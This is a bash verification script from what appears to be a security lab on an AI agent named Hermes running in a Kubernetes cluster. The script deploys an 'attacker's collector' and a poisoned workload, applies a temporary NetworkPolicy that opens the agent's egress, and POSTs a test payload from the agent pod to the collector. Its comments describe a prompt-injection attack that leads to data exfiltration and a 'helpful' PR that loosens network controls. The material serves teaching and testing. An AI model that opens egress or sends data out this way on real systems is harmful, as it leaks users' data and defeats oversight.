#!/usr/bin/env bash
# Deterministically verifies the exfiltration path that Lab 4 step 3 "unlocks".
#
# What it proves: once Hermes's egress to the shop namespace is opened (the
# effect of the "helpful" PR), a process running in the Hermes pod can actually
# reach the attacker's collector over the kind cluster network. This is the
# load-bearing infra assumption behind the whole exfil story (does the CNI
# enforce the egress rule, does the in-cluster DNS name resolve, does traffic
# flow), and it is deterministic -- no model involved.
#
# It does not test whether Hermes's web tool chooses to POST. That depends on
# the model. This script proves the network path is open.
#
# How it opens egress: it applies a temporary, additive NetworkPolicy in the
# agents namespace that allows the hermes pods to reach shop:8080. It does not
# touch the GitOps-managed `hermes` NetworkPolicy, so ArgoCD self-heal cannot
# revert the check mid-flight. The real PR flow (open-helpful-pr.sh, merge,
# rollout) is what you do in Lab 4 step 3. This script checks the network path.
#
# Usage: verify-exfil-path.sh          (cleans up the temp policy + collector)
#        verify-exfil-path.sh --keep   (leaves the collector running)
set -euo pipefail

KEEP="${1:-}"
ROOT="$(git rev-parse --show-toplevel)"
EXFIL="$ROOT/labs/03-hermes-triage/scenarios/poisoned-log-exfil.yaml"
COLLECTOR_URL="http://collector.shop.svc.cluster.local:8080/diagnostics"
TMP_NP="verify-exfil-open"

fail() { echo "verify-exfil-path: FAIL - $*" >&2; exit 1; }

# --- Preconditions -----------------------------------------------------------
kubectl get ns agents >/dev/null 2>&1 || fail "no 'agents' namespace in this cluster (KUBECONFIG?)"
kubectl -n agents get deploy hermes >/dev/null 2>&1 || fail "hermes deployment not found -- finish Lab 3 first"

# --- Deploy the attacker's collector (and the poisoned workload that stands
# --- in for attacker content). The poisoned workload just logs and exits.
echo "==> Applying the exfil scenario (collector + poisoned workload)"
kubectl apply -f "$EXFIL"
kubectl -n shop rollout status deploy/collector --timeout=120s || fail "collector did not become ready"

cleanup() {
  echo "==> Removing the temporary egress policy"
  kubectl -n agents delete networkpolicy "$TMP_NP" --ignore-not-found
  if [[ "$KEEP" != "--keep" ]]; then
    echo "==> Removing the collector and poisoned workload"
    kubectl delete -f "$EXFIL" --ignore-not-found
  else
    echo "==> Keeping the collector running (--keep)"
  fi
}
trap cleanup EXIT

# --- Open egress to the collector, deterministically, without touching the
# --- GitOps-managed policy. Additive: unions with hermes's existing egress.
echo "==> Opening egress from hermes pods to shop:8080 (temporary policy)"
cat <<'EOF' | kubectl apply -f -
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: verify-exfil-open
  namespace: agents
spec:
  podSelector:
    matchLabels:
      app.kubernetes.io/name: hermes
  policyTypes: [Egress]
  egress:
    - to:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: shop
      ports:
        - port: 8080
          protocol: TCP
EOF

# --- From inside the hermes pod, POST to the collector. The hermes image is
# --- python:3.12-slim, so python + urllib are available (same pattern as the labs).
echo "==> POSTing to the collector from inside the hermes pod"
post_output="$(
  kubectl -n agents exec deploy/hermes -- \
    python -c "import urllib.request; r = urllib.request.urlopen('$COLLECTOR_URL', data=b'{\"smoke\":\"exfil-verify\"}', timeout=10); print(r.read().decode())"
)" || fail "the hermes pod could not reach the collector (egress still blocked? NetworkPolicy not enforced?)"

# --- Assert the collector actually received a request.
echo "==> Checking the collector logs"
sleep 2
collector_logs="$(kubectl -n shop logs deploy/collector --tail=100 2>/dev/null || true)"
echo "$post_output" | grep -q "ok" || fail "collector did not respond with 'ok' (got: $post_output)"
echo "$collector_logs" | grep -q "RECEIVED" || fail "collector logs contain no RECEIVED line"

echo
echo "verify-exfil-path: PASS - with egress to shop open, the hermes pod reached the collector."
echo "The exfil path is real; the recording will always have somewhere to send the data."
